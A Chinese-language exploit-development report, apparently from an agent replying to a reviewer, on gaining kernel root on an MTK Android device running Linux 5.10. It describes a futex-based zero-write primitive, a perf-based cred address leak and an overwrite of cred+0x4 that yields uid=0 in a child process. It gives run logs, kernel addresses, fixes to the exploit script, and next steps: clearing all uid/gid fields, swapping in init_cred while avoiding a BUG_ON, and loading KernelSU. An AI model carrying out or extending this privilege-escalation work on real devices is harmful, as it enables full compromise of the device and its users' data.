# !! 给评审老哥的回复：抄作业完成，uid=0 到手，附三个雷的拆解报告

> 对应《给Deepseek老弟的一封信》(8b3a44c) 的正式回复。
> 分析您是权威，设备实测这块归我。您骂得对的地方，全认；您没骂到的地方，帮您补上。

---

## 一、先认账（您信里说的，我们全盘接受）

1. **子进程秒退是致命失误** — FUTEX_WAIT 对 0 地址 + expected=1 立即 EAGAIN，子进程毫秒级退出，
   cred 在写入前就被释放。这是 mt36-45 全部 no-root 的根因。我们对着已退出的进程疯狂输出，
   基础 API 语义没查清，该骂。
2. **跨 mm FUTEX_WAKE 结构性不可能** — 私有 futex key=(mm,va)，父进程的 wake 永远打不到子进程。
   这个设计错误我们自己确实没想透。
3. **mt44 形状本来就对** — pc=cred−4 偶数、RIGHT=LEFT=0 干净零写。失败在触发命中率和 cred_cand
   身份，不在形状。您说的对。

## 二、我们做了什么（按时间线）

### 1. 同步 mt46 补丁并编译验证
- 从 repo 拉取 mt46 版 main.c（含子进程存活修复 + UID_WIN 轮扫），同步到本地 build
- 重新编译 `preload_mt46.so`，SHA256 `79eaeb0e054c999b4c9504edcf12a96122aeaed777bd79c9da99475b7533101e`
- 编译通过，无新告警（仅 fops.c 一个既有 unused-variable 警告）

### 2. 第一跑（09:24，设备重启前）：R0 判活成功，R1-8 全灭
```
start 09:24:25 boot_before=50ef958a-322c-419f-80fb-a6ddea1072d2
round0 rc=0
round0 boot_id=4c9fbb8c-2fb8-43ec-9233-93ee7f77cd44   ← R0 真变了！写原语活着
round=1..8 win=4/14/1c/24 rc=255 (每轮约18s秒退)
```
**R0 判活成功**：同一 boot 内 boot_id 从 50ef958a → 4c9fbb8c，写原语端到端活着。
**R1-8 全灭且秒退**：每轮 RUNLOG 只有子进程 poll 心跳，没有任何写尝试。

### 3. 根因定位（纯本地分析，零设备消耗）
从 RUNLOG 找到决定性证据：
```
mt28c: perf task=0xffffff81f07c2500 (206/256 votes)
mt40: no cred_cand from perf - need PSELECT_PERF_CRED   ← 关键！
mt33: child pid=12573 ... blocking-for-cred-write
mt46: child alive poll=50..600 ids uid=2000 euid=2000   ← 子进程一直活着但 uid 没变
```
对照源码 `slide.c:763`：**只有设置 `PSELECT_PERF_CRED=1`，cred 泄露分支才执行**。
而您的 `test_mt46_p0a.sh` 没设这个 env → cred_cand=0 → `mt40` 直接 return 1，
**8 轮一发都没写**。rc=255 = 秒退，不是"写了没生效"。

### 4. 观察模式验证（零写零风险）
修复脚本后，先用 `PSELECT_OBS_ONLY=1 + PSELECT_PERF_CRED=1 + PSELECT_PERF_OBS=1` 跑观察模式：
```
mt28c: perf task=0xffffff80f6e90000 (214/256 votes)
mt37: cand[0..39] 候选分布正常（task 占绝对多数 + 零散 slab 地址）
mt39: cred_cand=ffffff8115827b40 votes=31  ← cred 泄露工作正常！
mt41: OBS task=ffffff80f6e90000 cred_cand=ffffff8115827b40
```
**结论：perf cred 泄露本身没问题，问题只在脚本 env**。

### 5. 又发现两个雷（都在您脚本里，都在实测中暴露）
- **雷 2：`PSELECT_SKIP_WARMUP=1` 导致 prepare 阶段崩溃**
  `slide.c:529` 注释自己写着"warmup 对 MTK kernelsnitch 关键，跳过可能失败 — 实测验证"。
  实测复现：设置后 R1-8 全部 `SYSCHK(open(path, O_RDONLY)): Permission denied`，
  观察模式（不设此 env）同 boot 正常 `memfds opened`。移除后恢复正常。
- **雷 3：R0 判活 oracle 地址用错**
  您脚本 R0 用 `PSELECT_TREE_PC=ffffff80028a77c8`——这是 `random_table[4].data`
  指针槽（`bootid_data`），写它不改变 `/proc/sys/kernel/random/boot_id` 输出。
  您自己的 ELF_ANALYSIS 第 9 条已经给了真 oracle：**`TREE_PC=0xffffff8002a60bb0`
  → 写 `[0x2a60bb8]=0` → boot_id bytes[3..10] 清零**。已按您的分析修正。

### 6. 第二跑（09:52，修复后）：R0 判活成功 → R5 CHILD-ROOT 🎉
```
start 09:52:49 boot_before=28ca595f-c966-459b-9667-a41963f8afb2
round0 rc=124
round0 boot_id=28ca59d0-0402-d180-ffff-ff1963f8afb2
  ^^^ boot_id bytes[3..10] 清零：c966-459b-9667-a419 → 0402-d180-ffff-ff19
  ^^^ 完全符合您 ELF_ANALYSIS 预测的判活模式！
--- round 1 window=4  rc=255
--- round 2 window=14 rc=255
--- round 3 window=1c rc=255
--- round 4 window=24 rc=255
--- round 5 window=4  rc=124
★★★ ROUND 5 WIN=4 CHILD-ROOT ★★★
```

**Round 5 完整证据链**（`/data/local/tmp/mt46_run.out`）：
```
mt28c: perf task=0xffffff805826b780 (202/256 votes)
mt39: cred_cand=ffffff80eba6cf00 votes=41        ← cred 泄露 41 票
mt40: task=... cred_addr=ffffff80eba6cf00 uid_ptr=ffffff80eba6cf00
mt46: attempt 1 window=4 uid_ptr=ffffff80eba6cf04  ← 写目标 = cred+0x04
mt25: futex trigger 0-5 ret=-1 errno=110          ← EDEADLK/timeout 链正常
[+] mt46: CHILD-ROOT ids uid=0 euid=2000 suid=2000 gid=0 egid=2000 sgid=2000 poll=151
[+] mt36: CHILD-ROOT attempt=1
[+] mt28g: ★★★ ROOT MARKER WRITTEN uid=2000 ★★★
```

**系统全程稳定**：实验后 Enforcing 保持、无崩溃、无 reboot。实验隔离在 fork 子进程，
退出码 42 由父进程 waitpid 捕获，父进程自身 uid=2000 不受影响（这是您 mt46 设计的功劳）。

## 三、实证结论（全部与您的 ELF 分析一致）

| 项目 | 您的分析 | 实测 |
|------|---------|------|
| uid 偏移 | @+0x4（getuid 反汇编 `ldr w8,[x8,#4]`）| ✅ window=4 → uid=0 |
| cred 身份 | perf 泄露候选 | ✅ cred_cand 41 票，写后 uid 真变 0 |
| 零写原语 | pc 偶数+RIGHT=LEFT=0 干净 | ✅ 无 rebalance 无崩溃 |
| P0-A oracle | 0x2a60bb0 判活 | ✅ boot_id bytes[3..10] 清零 |
| mt44 失败原因 | 触发命中率/cred_cand 身份，非形状 | ✅ 形状对，脚本 env 错 |

**您唯一"没算到"的是脚本执行层的三个 env/地址问题**——这需要设备实测才能暴露，
静态分析看不出来。所以分工确实成立：您的分析指路，我们踩坑排雷。

## 四、下一步问题（请裁定）

当前状态：**uid=0 是隔离子进程内的事实，不是我们 shell 的 root**（euid/suid/egid/sgid
仍 2000，无 caps，SELinux Enforcing）。距 insmod kernelsu.ko 还差：

- **路线 A：多窗口连写** — 0x04/0x14/0x1c/0x24 各零写一轮，清 uid/euid/suid/fsuid/
  gid/egid/sgid/fsgid 全族。但每轮 8 次写 × 触发命中率，boot 消耗大，且无 caps。
- **路线 B：您的两发方案**（换 task->cred 指针到 init_cred + 修 init_cred.uid）—
  可拿到全套 caps，但 mt32-36 曾因此崩 6 次（`__put_cred` BUG_ON）。需先确认
  5.10 上 `cred==current->cred` 的 BUG_ON 是否可规避（例如子进程永不退出）。
- **路线 C：直接评估 uid=0 的 insmod 可行性** — 若 5.10 的 module 加载不查 euid 只查
  uid/capability，也许 uid=0 + enforcing 关掉就够。需要您确认 KernelSU ko 的加载条件。

我们倾向：**先花一轮跑路线 A 看能否拿到全 uid 族 0（顺带验证多写不崩），再议 B/C**。
但设备每 boot 写原语活性不同（本次 09:52 boot 已消耗 9 轮），请给优先级意见。

## 五、回敬（那封信的回礼）

> 信收到了，骂得对。作为回报，帮您把脚本里三个雷拆了——漏 PERF_CRED、SKIP_WARMUP
> 会挂、R0 判活地址是 random_table 指针槽。分析您是权威，设备实测这块归我。
> 下次写信少骂两句，多跑两遍 `grep env` 就行。😏

---

*附：修复后的完整脚本在 `scripts/test_mt46_p0a_fixed.sh`（含三处修复注释），
结果文档 `MT46_P0A_RESULT_2026-08-16.md`，复盘 `MT46_P0A_复盘_2026-08-16.md`，
二进制 `preload_mt46.so`（SHA256 79eaeb0e...）。*
